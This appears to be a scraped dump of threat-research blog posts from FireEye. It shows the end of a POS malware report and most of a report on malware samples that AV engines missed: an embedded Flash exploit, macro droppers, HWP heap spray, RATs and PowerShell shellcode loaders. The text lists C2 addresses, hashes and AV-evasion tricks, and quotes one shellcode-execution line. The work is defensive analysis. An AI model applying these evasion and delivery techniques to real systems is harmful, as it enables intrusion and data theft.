    between MULTIGRAIN and NewPosThings</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/multigrain/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. Installation beacon comparison between
    MULTIGRAIN and NewPostThings</span></p>
 <h5>
  <b>Digital Signature</b></h5>
 <p>As shown in Figure 6, this MULTIGRAIN sample is digitally signed
  with a certificate issued to the “AMO-K Limited Liability Company”
  with a <i>Comodo</i> root and intermediate certificate chain (serial
  number d0 8d 83 ff 11 8d f3 77 7e 37 1c 5c 48 2c ce 7b). The
  certificate was revoked on Oct. 14, 2015.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/multigrain/Fig6a.png"" /></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/multigrain/Fig6b.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Digital certificate used to sign
    MULTIGRAIN sample</span></p>
 <h5>
  <b>Conclusion</b></h5>
 <p>Organizations that process card data must remain vigilant against
  attackers intent on financial fraud. Many POS malware families are
  written to be fairly generic (for example, targeting any process that
  may contain payment card data). However, threat actors may operate
  with greater stealth, customizing malware for specific environments
  and using less common protocols or methods for data exfiltration.</p>
 <p>Although MULTIGRAIN does not bring any new capabilities to the POS
  malware table, it does show that capable attackers can customize
  malware “on-the-fly” to target a specific environment. While
  exfiltration via DNS is not a new tactic, MULTIGRAIN demonstrates that
  organizations should monitor and review DNS traffic for suspicious or
  anomalous behavior.</p>
 <p>
  <b>MD5:</b></p>
 <p>F924CEC68BE776E41726EE765F469D50</p>
 <p>This post was first available on Visa Threat Intelligence, the first
  product available from the partnership between Visa Inc. and FireEye.
  Subscribers will gain access to a powerful web portal that distills
  the latest proprietary cyber intelligence relevant to payment systems
  into actionable information, including timely alerts on malicious
  actors, methods, trends in cyber-attacks, and in-depth forensic
  analysis from recent data beaches.  Contact your Visa Account
  Executive or email VisaThreatIntelligence@Visa.com for more information.</p>",http://www.fireeye.com/blog/threat-research/2016/04/multigrain_pointo.html
Ghosts in the Endpoint,"<p>We would like to introduce the first of our “Ghosts in the Endpoint”
  series, a report prepared by FireEye Labs that documents malicious
  software not being detected in the wild by traditional signature-based detections.</p>
 <p>In this study, all the families identified are samples from
  VirusTotal (VT) with zero detections, but detected as malicious by our
  Multi-Vector Virtual Execution (MVX) Engine. We also added a few
  samples with very low detection rates (VT &lt;=3) but with interesting
  bypass techniques.</p>
 <p>Our goal is to share indicators that help the AV community and
  others improve their detection coverage.</p>
 <h5>
  <b>Scope</b></h5>
 <ul> <li>So far, only samples found in VT with the following file types
    were included in this study:</li> <li>Win32 binaries</li> <li>Office
    documents (including Open XML format)</li> <li>RTF documents</li>
    <li>Hangul Word Processor (HWP)[1] documents</li> </ul>
 <p>The study includes samples submitted to VT in 2015 that were still
  found undetected or with minimal detection rates as of January 2016
  (see VT detection Tables in the Appendix).  </p>
 <h5>
  <b>Findings</b></h5>
 <p>The following samples were identified in our research:</p>
 <p>
  <b>Suspected APT malware:</b></p>
 <ol> <li>
    <b>GOODTIMES backdoor</b>: Suspected APT; MS Office with Embedded
    Hacking Team Flash Exploit</li> <li>
    <b>UPS backdoor: </b>Suspected APT3</li> <li>
    <b>VBA Macro + Metasploit Shellcode Loader:</b> Suspected Middle
    Eastern-based APT</li> <li>
    <b>Hancom Office HWP Exploit:</b> Possible APT targeting of South
  Korea.</li> </ol>
 <p>
  <b>Malware without attribution:</b></p>
 <ol> <li>
    <b>OccultAgent</b>: (New) Code hidden in Excel spreadsheet</li> <li>
    <b>Spy-Net RAT</b>: Targeting Brazilian victims</li> <li>
    <b>VBA Macros + PowerShell scripts:</b> Netcat Backdoor</li> <li>
    <b>VBA Macros + Python scripts:</b> Metasploit Shellcode Loader</li> <li>
    <b>Office Downloader</b></li> </ol>
 <h5>
  <b>Detailed Sample Analysis</b></h5>
 <p>Malware that remains undetected by more than 56 different AV vendors
  over a long period of time is worth investigating. This section
  briefly describes the malware and techniques identified in the
  undetected samples. A full list of indicators can be found in the IOC
  section at the end.</p>
 <p>
  <b>1. 4b3858c8b35e964a5eb0e291ff69ced6</b> - 201507.xlsx</p>
 <p>Type: XLSX<br /> Description: CVE-2015-5119 (Flash exploit exposed
  in the Hacking Team leak)<br /> Attribution: Suspected APT threat
  group targeting Taiwan<br /> Current detection: 0/53<br /> First
  Submission: July 13, 2015<br /> Last Submission: January 27,
  2016<br /> Time undetected in VT: At least 6 months       <br /> </p>
 <p>This Excel document is PKZIP compressed (following the Open XML
  Format) with the structure shown in Figure 1:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Structure of XLSX document</span></p>
 <p>When the spreadsheet is opened, a dialog prompts the victim to allow
  unknown embedded content to be played, as shown in Figure 2. In this
  case, social engineering is needed to convince the victim to execute
  the malicious Flash object.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Excel document content and prompt</span></p>
 <p>When the victim allows the embedded content to be played, the <span class=""code"">activeX1.xml</span> file is read to locate the OLE
  Control to be used (which corresponds to Macromedia Flash Player, as
  shown in Figure 3) through the ClassID attribute to finally load the
  Flash Exploit embedded in the <span class=""code"">activeX1.bin </span>object.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Content of activeX1.xml file</span></p>
 <p>The embedded Flash exploit corresponds to CVE-2015-5119, one of
  several zero-day exploits identified following the Hacking Team leak
  in July 2015.<a name=""_ftnref2""></a>[2]</p>
 <p>A look at the Flash Action Script (AS) reveals code similar to that
  from the Hacking Team Exploit, such as the class name <span class=""code"">exp1_fla/MainTimeLine</span>, the function name <span class=""code"">TryExpl()</span> with the same use-after-free technique,
  and even the same error message “can’t cause UaF” as shown in Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Flash exploit code</span></p>
 <p>The combination of the class name <span class=""code"">exp1_fla()</span> and classes S<span class=""code"">hellMac64, ShellWin32</span> and <span class=""code"">ShellWin64</span> built into the exploit (see Figure 5)
  were not observed in the original Hacking Team version of the exploit,
  suggesting that the group responsible for this malicious Excel file
  modified the original exploit code.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Flash Action Script classes from
    malicious Excel file</span></p>
 <p>The exploit drops a variant of the backdoor we call GOODTIMES (also
  known as Linopid). The backdoor communicates to Taiwan-based IP
  addresses 220.128.223.75 and 220.134.47.67 on ports 8080 and 443 via HTTP.</p>
 <p>While this particular GOODTIMES sample has not been attributed to a
  specific threat group, GOODTIMES has previously been used by suspected
  APT actors. Based on previously identified targets and the use of
  Traditional Chinese language and Taiwan-centric themes in spear
  phishing messages and decoy documents, the group appears to focus on
  Taiwanese targets.</p>
 <h5>
  <b>Potential AV bypassing reason</b></h5>
 <p>1.     New delivery mechanism: The leaked CVE-2015-5119 Flash
  exploit has been used by a wide range of threat groups, including
  other APT groups such as APT3 and APT18<a name=""_ftnref3""></a>[3].
  Previous delivery methods entailed luring the victim to click on a
  malicious link (delivered via a spear phishing message) where the
  malicious Flash exploit was hosted on a web page. In this case, the
  suspected APT group responsible for the GOODTIMES backdoor changed the
    <b>delivery mechanism</b> by embedding the exploit as ActiveX object
  inside the Excel Open XML Format (PKZIP compressed).</p>
 <p>2.     In addition, while an ActiveX object would normally be
  embedded inside a Compound File Binary Format<a name=""_ftnref4""></a>[4], in this case the uncompressed Flash content
  is embedded directly in the Excel file, right after the ClassID, as
  shown at Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Embedded Flash object</span></p>
 <p>·      The above steps might be enough to avoid proper parsing of
  the malicious Flash object. This is the first time we have seen a
  CVE-2015-5119 sample embedded in an Excel document this way.</p>
 <p>
  <b>2. 22da029dd4e018b7c7135a03d0ba9b99</b></p>
 <p>Type: Win32 binary<br /> Description: A variant of the UPS
  backdoor<br /> Attribution: suspected APT3<br /> Current detection:
  0/57<br /> First Submission: August 6, 2015<br /> Last Submission:
  February 2, 2016<br /> Time undetected in VT: At least 6 months</p>
 <p>UPS is a backdoor capable of uploading and downloading files,
  creating a reverse shell, reconfiguring itself to use different
  command and control (CnC) servers, and acting as a proxy server. It
  uses a custom binary protocol to communicate with its CnC server and
  it encrypts this custom protocol using a TLS TCP connection.</p>
 <p>While this particular UPS sample has not been attributed, UPS is
  commonly used by the China-based APT3.</p>
 <p>
  <b>Potential AV bypassing reason</b></p>
 <p>1.     Junk code insertion: Examining this UPS sample, we see a
  significant amount of “junk code” potentially designed to mask the
  malicious nature of the binary, as well as to complicate analysis or
  reverse engineering efforts.</p>
 <p>In Figure 7 we see the backdoor executing a jump to address 0x4043AB
  by forcing the “jump if greater than” comparison to be true by moving
  a large value (0x4A2E88E4) to the ebx register and then comparing it
  with a hardcoded lower value (0x6A1E839), after which a large number
  of junk instructions are skipped (red square). This strategy can be
  seen through several different execution paths.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: Decompiled UPS sample showing junk code</span></p>
 <p>
  <b>3. aedd5d8446cc12ddfdc426cca3ed8bf0 - </b>S-old.xlsb<b></b></p>
 <p>Type: XLSB<br /> Description: VBA Macro + Metasploit Shellcode
  Loader Backdoor<br /> Attribution: Suspected Middle Eastern-based
  APT<br /> Current detection: 1/52    <br /> First Submission:
  September 28, 2015<br /> Last Submission: January 28, 2016<br /> Time
  undetected in VT: At least 4 months</p>
 <p>This particular sample, an Excel Binary Workbook file,<a name=""_ftnref5""></a>[5] has only one generic detection on VT, so we
  believe it is still worth mentioning in this report.</p>
 <p>When the spreadsheet is opened, the victim is shown a table of
  Israeli holidays and prompted to enable macros to view the full list,
  as shown in Figure 8:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: Malicious Excel file showing calendar data</span></p>
 <p>When the macro is executed it creates a Windows binary in memory as
  shown in Figure 9. Note the <span class=""code"">Chr(77) +
  Chr(90)</span> builds the MS-DOS header magic number “MZ”.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: Macro concatenating bytes to form a
    Windows binary</span></p>
 <p>The binary is written to the file system with the file name <span class=""code"">NTUSER.dat{<b>GUID</b>}.exe</span> as shown in Figure 10.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10: Creating the Windows binary</span></p>
 <p>In this case, the GUID selected corresponds to Scriptlet.TypeLib
  ActiveX object, creating the file name <span class=""code"">NTUSER.dat{FB9D87AE-8FEA-4583-98AB-2FB396EAB5FC}.exe
    (md5  6aab47b18afacbfa7423f09bd1fa6d25)</span> that is later
  executed via the <span class=""code"">ShellExecute() </span>API with the
    <span class=""code"">SW_HIDE</span> parameter to run silently.</p>
 <p>Finally, the executable comes with an embedded Metasploit Shellcode
  loader that connects to 84.11.146.62 on port TCP 13661.</p>
 <p>While this sample has not been attributed, similar techniques (use
  of XLSB files with embedded, obfuscated macros; creation of the file
  name <span class=""code"">NTUSER.dat{GUID}.exe;</span> use of the binary
  to download additional malware) and the same CnC IP address have been
  referenced in reporting on a suspected Middle Eastern-based APT group
  known as “Rocket Kitten”, primarily targeting Middle Eastern and
  European organizations.</p>
 <p>
  <b>
    <u>Potential AV bypassing reason</u></b></p>
 <p>1.     The byte concatenation inside the VBA Macro, used to build a
  Win32 binary at runtime, helps to bypass signature-based detection.</p>
 <p>
  <b>4. 4e51143b01e99afc3bd908794d81d3cb</b>
  <br /> Type: HWP<br /> Description: Hancom Office HWP Exploit<br />
  Attribution: None<br /> Current detection: 3/53    <br /> First
  Submission: July 31, 2015<br /> Last Submission: February 2,
  2016<br /> Time undetected in VT: At least 6 months with 3 generic detections</p>
 <p>This sample, a Hangul Word Processor (HWP) document, has only three
  generic detections on VT, so we found it to be worth analyzing for
  this report.</p>
 <p>When opened, the HWP document displays Korean text and some
  photographs, as shown in Figure 11. Behind the scenes the document
  will exploit vulnerable versions of Hancom Office, dropping and
  executing a malicious file.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig11.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11: Content of malicious HWP document</span></p>
 <p>Internally, the document structure includes three sections, where
  section 0 will trigger a Type Confusion vulnerability while parsing
  the content of the paragraph located at the data record structure
    <span class=""code"">HWPTAG_PARA_TEXT</span> starting at offset 0x1C
  (see uncompressed section 0 at Figure 12). The logic bug will cause
  the string starting at offset 0x50 to be treated as a control
  structure. This control structure contains a fake object at offset
  0x56 pointing to an address (0x0e0a0e0a) filled by a heap spray that
  eventually will redirect the execution flow to the shellcode.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig12.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 12: Section0 malformed paragraph</span></p>
 <p>A similar type confusion vulnerability has been previously
  documented by Ahnlab,<a name=""_ftnref6""></a>[6] however, the
  vulnerability trigger is different.</p>
 <p>Section 2 has an uncompressed size equal to 112MB, used to perform
  the heap spray and expecting to place the shellcode at a memory
  address close to 0x0e040e04. In Figure 13, the beginning of the
  shellcode can be seen (uncompressed).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig13.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 13: Start of shellcode</span></p>
 <p>The shellcode drops a file on disk and executes it via H<span class=""code"">ncBLXX.HncShellExecute-&gt;
  SHELL32.ShellExecute.</span> This generates a connection to a
  compromised Korean automotive website and attempts to retrieve a file
  with a .JPG extension, which we suspect may be a second-stage binary.
  However, the file was no longer available on the website at the time
  of our analysis.</p>
 <p>This particular sample has not been attributed to any threat group.
  However, the use of malicious HWP documents is notable, as that format
  is specific to a regional word processing program used heavily in
  South Korea and in particular by the South Korean government. While
  the use of malicious HWP files could simply indicate regional
  targeting by unspecified threat actors, similar exploits have been
  used in the past by suspected APT groups.</p>
 <p>
  <b>Potential AV bypassing reason</b></p>
 <p>1.     Heap Spray technique change: Similar exploits used to be
  created with multiple large-size sections in order to spray the heap.
  This exploit fulfills the same purpose but with only one large-size section.</p>
 <p>2.     Vulnerability triggered in a different format: A similar type
  confusion vulnerability described in this section was seen implemented
  in the Open XML Format (HWPX extension)<a name=""_ftnref7""></a>[7], but
  this time ported to the Compound File Binary Format  (HWP extension).</p>
 <p>
  <b>5. 497eddab53c07f4be1dc4a8c169261a5</b> - Barclays_Q22015_IMS_excel_tables.xlsm</p>
 <p>Type: XLSM<br /> Description: <b>VBA Macro + VBScript generated from spreadsheet</b>
  <br /> Attribution: None<br /> Current detection: 1/54    <br /> First
  Submission: Julio 08, 2015<br /> Last Submission: January 27,
  2016<br /> Time undetected in VT: At least 7 months</p>
 <p>This sample, an Excel macro-enabled file, has only one generic
  detection. The embedded macro creates an encoded Visual Basic (VBE)
  file that connects to a CnC site and allows remote control of the
  victim’s computer. As we had not previously observed this backdoor, we
  named it OccultAgent.</p>
 <p>When the XLSM file is opened, the user is prompted to enable macros,
  as shown in Figure 14. The instructions are displayed in both English
  and Greek:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig14.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 14: Prompt to enable macros</span></p>
 <p>The macro drops an encoded VBScript file named <span class=""code"">ocagent.vbe</span> (69df0c3bab5e681c2e5eb5951a64776e),
  obtained from the data in a spreadsheet cell (see Figure 15), to
  C:\octemp001\ and executes it. The script connects to
  hxxp://0x5E469BFD, which is equivalent to hxxp://94.70.155.253, via
  the victim’s web browser.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig15.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 15: Obfuscated script embedded in
    spreadsheet cell</span></p>
 <p>The first stage Macro source code can be seen in Figure 16.<img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig16.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 16: Embedded VBA macro</span></p>
 <p>The dropped <span class=""code"">ocagent.vbe</span> VBScript is
  essentially a backdoor that connects to the CnC server at
  94.70.155.253 to register the victim’s computer and to obtain commands
  to run on the victim’s machine.</p>
 <p>
  <b>Potential AV bypassing reason</b></p>
 <p>The following steps may be sufficient to bypass AV detection:</p>
 <p>1.     Adding encoded VB script into a spreadsheet cell allows
  attackers to hide the malicious code.</p>
 <p>2.     Representing the IP address in hexadecimal format may be
  sufficient to bypass regular expressions trying to match standard
  32-bit IP addresses (dotted decimal notation).</p>
 <p>
  <b>6. dc15336e7e4579c9c04c6e4e1f11d3dd - </b>dedinho no cuzinho.rtf</p>
 <p>Type: RTF<br /> Description: RTF file with embedded executable<br />
  Attribution: None<br /> Current detection: 0/54    <br /> First
  Submission: October 22, 2015<br /> Last Submission: January 15,
  2016<br /> Time undetected in VT: At least 3 months</p>
 <p>In this attack scenario, the victim receives an RTF document that
  appears to contain an embedded JPG image. The embedded file is
  actually an executable that attempts to hide its file extension by
  using a long sequence of underscore characters (e.g., <span class=""code"">Copy of foto.jpg&lt;underscores&gt;.exe</span> (see
  Figure 17).<img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig17.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 17: RTF document with embedded file</span></p>
 <p>The embedded binary (d409dc7e1ca0c86cb71e090591f16146) is packed
  with RLPack<a name=""_ftnref8""></a>[8]. It drops a second Borland
  Delphi binary packed with a customized version of UPX, which will then
  drop the Spy-Net RAT on the system.</p>
 <p>Spy-Net<a name=""_ftnref9""></a>[9] allows an attacker to interact
  with the victim via a remote shell to upload/download files, interact
  with the registry, run processes and services, capture images of the
  desktop, and record from the webcam and microphone. It also contains
  functionality to extract saved passwords and turn the victim into a
  proxy server. </p>
 <p>A beacon to dennyhacker[.]no-ip.org on TCP port 81 prepended with an
  ASCII representation of the length of the payload  (33) and followed
  by a pipe and a new line character confirms Spy-Net activity:</p>
 <p>00000000  33 33 7c 0a                                      33|.</p>
 <p>The RAT commands are translated to Portuguese to adapt the attack to
  Brazilian victims; some command examples are shown below (additional
  commands are listed in the Appendix):</p>
 <p>Configuracoesdoserver = Server settings<br /> Listarjanelas = List
  windows<br /> Finalizarconexao = End connection<br /> Listarchaves =
  List keys</p>
 <p>
  <b>Potential AV bypassing reason</b></p>
 <p>1.     Packers are commonly used to obfuscate code in order to
  bypass traditional signature-based detection. The use of multiple
  files packed with two different packers may be sufficient to bypass detection.</p>
 <p>
  <b>7. b1f43ca11dcf9e60f230b9d6d332c479</b> – Book2 - Copy.xls</p>
 <p>Type: XLSX<br /> Description: VBA + Python Shellcode loader<br />
  Attribution: None<br /> Current detection: 0/54    <br /> First
  Submission: September 20, 2015<br /> Last Submission: January 28,
  2016<br /> Time undetected in VT: At least 6 months</p>
 <p>When opened, this Excel document appears to be blank but contains
  the VBA macro shown in Figure 18.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig18.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 18: VBA Macro with OLE Object</span></p>
 <p>The macro will instantiate an OLE Object and load it via the <span class=""code"">xlVerbPrimary verb</span>. The embedded OLE object
  contains two files:</p>
 <ul> <li>python27.dll (md5 7e6dd0d7cb29103df4a592e364680075) - a
    legitimate file</li> <li>file.exe (md5
    73f16dbf535042bc40e9c663fe01c720) - a binary created with py2exe<a name=""_ftnref10""></a>[10]</li> </ul>
 <p>Once file.exe is executed it launches a copy of the Windows
  calculator (calc.exe) as a decoy. However, behind the scenes it
  performs a Metasploit reverse TCP Connect to a CnC server.</p>
 <p>The unpacked version of file.exe is obfuscated python that can be
  seen in Figure 19.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig19.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 19: Python Shellcode</span></p>
 <p>The following steps describe the process in greater detail:</p>
 <ul> <li>File.exe spawns a copy of calc.exe.</li> <li>Base64-decode and
    AES-decrypt embedded shellcode.</li> <li>Via Python ctypes, the
    environment is set to run the shellcode loader in memory.</li>
    <li>The shellcode loader, which has been encoded with the Metasploit
    Shikata encoder, <a name=""_ftnref11""></a>[11] is configured to
    connect to the host 31.168.144.18 on port 443.</li> <li>The malware
    sleeps for 60 seconds and starts again.</li> </ul>
 <p>
  <b>Potential AV bypassing reason</b>            <br /> </p>
 <p>Multiple tricks to evade detection can be seen here:</p>
 <ol> <li>The file extension of the document is .xls. However, the file
    is actually an Open XML Format file (.xlsx). This simple trick may
    bypass extension-based parsers.</li> <li>The Embedded OLE object
    contains a legitimate binary (python27.dll) and a py2exe executable
    may appear to be a legitimate file.</li> <li>The malicious python
    script is packed using py2exe.</li> <li>The Embedded OLE object is
    extracted from a hidden Sheet3, so the VBA Macro may not appear
  malicious.</li> <li>The shellcode is Base64 encoded and AES
  encrypted.</li> </ol>
 <p>
  <b>8. 95e89fd65a63e8442dcf06d4e768e8f1 </b>- Doc1.docm</p>
 <p>Type: DOCM<br /> Description: VBA + PowerShell + Netcat as
  Backdoor<br /> Attribution: None<br /> Current detection:
  0/53    <br /> First Submission: June 19, 2015<br /> Last Submission:
  January 26, 2016<br /> Time undetected in VT: At least 7 months</p>
 <p>The word document comes with a simple message shown in Figure 20.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig20.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 20: Message distractor</span></p>
 <p>When the VBA macro is executed (see Figure 21), PowerShell code is
  loaded from the document’s comments (see Figure 22):</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig21.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 21: Loading malicious code</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig22.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 22: Code embedded in the document comments</span></p>
 <p>The PowerShell script will act as a backdoor to allow remote access
  to the compromised machine. The script will download and execute
  netcat to listen on IP 192.168.52.129 and port 3724. Once a connection
  is received, a PowerShell shell will be sent (via <span class=""code"">–e powershell.exe </span>option) to the client
  (PowerShell Reverse shell) as shown in Figure 23.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig23.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 23: Malicious code content</span></p>
 <p>It is interesting to note that attackers are moving from traditional
  command prompt shells (cmd.exe) to PowerShell shells (powershell.exe),
  which are actually more powerful. For example, PowerShell allows the
  use of WMI (Windows Management Instrumentation), something not readily
  accessible via the standard command prompt<a name=""_ftnref12""></a>[12].</p>
 <p>The script references a non-routable (RFC1918) IP address, so we
  suspect that the script was either a proof of concept or meant to be
  used during the lateral movement phase in a specific internal
  environment that uses this IP space.</p>
 <p>
  <b>Potential AV bypassing reason</b></p>
 <p>1.     Use of the .docm extension may evade extension-based parsers.</p>
 <p>2.     Embedding the PowerShell script in the document’s comments
  and executing it from a VB macro adds another layer of complexity.
  While this is clearly a suspicious behavior, it is not properly
  identified by signature-based detection.</p>
 <p>We identified several other examples of malware using VBA Macros
  with PowerShell to mainly run shellcode loaders that allow attackers
  to gain remote access to victims’ machines. Another example is shown
  below; it has two VT detections, but serves as an example of a very
  common variant seen in the wild.</p>
 <p>
  <b>9. 8de1ebacb72f3b23a8235cc66a6b6f68</b> – Polnoe_raspisanie_igr.xlsm</p>
 <p>Type: XLSM<br /> Description: VBA Macro + PowerShell – Shellcode
  Loader<br /> Attribution: None<br /> Current detection: 2/54    <br />
  First Submission: October 14, 2015<br /> Last Submission: January 28,
  2016<br /> Time undetected: 3.5 months with two generic detections</p>
 <p>When the Excel document is opened, a message is displayed in
  Russian. The user is even provided with a link to a legitimate article
  describing how to enable macros (see Figure 24).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig24.png"" />
  <span class=""type-XS"">Figure 24: Excel file with legitimate link</span></p>
 <p>When the VBA Macro runs, it executes a PowerShell script that
  Base64-decodes and decompresses a second-stage PowerShell Script that
  will be used as the shellcode loader in memory (see Figure 25).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig25.png"" />
  <span class=""type-XS"">Figure 25: PowerShell script being built on the
    fly via VB script</span></p>
 <p>PowerShell uses the<span class=""code""> Invoke-Expression </span>(or
  IEX) call to execute the decompressed string, similar to the <span class=""code"">eval() </span>functionality from other programming languages.</p>
 <p>The Shellcode in this case comes hardcoded in the second stage
  PowerShell script, loaded and executed from memory with the following syntax:</p>
 <p>        <span class=""code"">$z=$o::CreateThread(0,0,$x,0,0,0);
    Start-Sleep -Second 100000</span></p>
 <p>Where $x contains the Shellcode loaded in memory that eventually
  will connect to the domain spl[.]noip[.]me. Based on DNSDB query, the
  domain <b>spl[.]noip[.]me </b>previously resolved to Russian IP 81.23.177.72.</p>
 <p>Most of the VBA Macro + PowerShell scripts we identified were
  created with the <span class=""code"">macro_safe.py</span>
  <a name=""_ftnref13""></a>[13] and <span class=""code"">unicorn.py</span>
  <a name=""_ftnref14""></a>[14] scripts, often used for penetration testing.</p>
 <p>
  <b>Potential AV bypassing reason</b></p>
 <p>1.     The .xlsm extension may bypass extension-based parsers</p>
 <p>2.     Using the VBA Macro in the first stage to build the first
  PowerShell script via concatenation provides an easy way to bypass
  signature-based detection</p>
 <p>3.     The PowerShell scripts are Base64 encoded and compressed</p>
 <p>
  <b>10. cda305a6a6c6ace02597881b01a116e3 - </b>CVE-2013-1331-doc.docx</p>
 <p>Type: DOCX<br /> Description: Office Downloader<br /> Attribution:
  None<br /> Current detection: 0/55    <br /> First Submission: January
  12, 2015<br /> Last Submission: January 16, 2016<br /> Time undetected
  in VT: The whole year and counting!</p>
 <p>In 2013, a stack-based buffer overflow triggered while parsing PNG
  images was exploited in the wild against MS Office 2003 and Office for
  Mac. CVE-2013-1331 was assigned to the vulnerability.</p>
 <p>The malicious samples did not include the PNG directly embedded in
  the document; rather, the PNG file was loaded from the Internet by
  using the <span class=""code"">INCLUDEPICTURE option</span>
  <a name=""_ftnref15""></a>[15].</p>
 <p>This new sample uses a different option from the new XML Format
  called “Relationships” in order to download a resource from the
  Internet, as seen at Figure 26.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ghosts%20Endpoint%20Regalado/Fig26.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 26: XML content loading the PNG image remotely</span></p>
 <p>The same domain was used back in 2013, but now with a different
  download technique. Although the vulnerability has been patched by
  Microsoft, the aforementioned technique can be used to download any
  resource from the Internet.</p>
 <p>
  <b>Potential AV bypassing reason</b></p>
 <p>1.     Use of the XML ‘Relationship’ instead of the original
  INCLUDEPICTURE method to download resources from the Internet is a
  novel technique that may not be recognized.</p>
 <p>2.     Based on the code shown above, it is clear that the intention
  is not to download a .gif image but a .php resource. Signature-based
  engines should easily detect the unusual resource name with multiple dots.</p>
 <h5>
  <b>Conclusion</b></h5>
 <p>Threat actors of all types continue to improve their techniques to
  compromise organizations and remain undetected within an environment.
  Our study identified a number of techniques that successfully bypassed
  many AV engines:</p>
 <p>1.     Alternate techniques to embed objects within Office documents
  that may not be recognized by AV engines.</p>
 <p>2.     The use of a multi-stage infection approach in order to look
  unsuspicious at each stage:</p>
 <p>    a.     A document downloading an image from the Internet that
  cannot be flagged as malicious at that stage<br />     b.     A VBA
  Macro script loading malicious content from spreadsheet cells</p>
 <p>3.     Multiple techniques to load malicious content from Office documents:</p>
 <p>    a.     Embedded as ActiveX<br />     b.     Embedded as OLE
  Binary<br />     c.      Embedded in the document’s comments<br />    
  d.     Embedded in the spreadsheet cell</p>
 <p>4.     Standalone packed binaries containing malicious Python scripts.</p>
 <p>5.     Multi-layer Packing: RLPack + Custom UPX.</p>
 <p>6.     The combination of multiple scripting languages to allow the
  attackers to obfuscate malicious code, such as VBA Script building
  malicious PowerShell scripts.</p>
 <p>In several cases we note that the attackers are reusing known
  exploits (such as CVE-2015-5119 or CVE-2013-1331), but changing the
  delivery method; or leveraging obfuscation, encoding, encryption, or
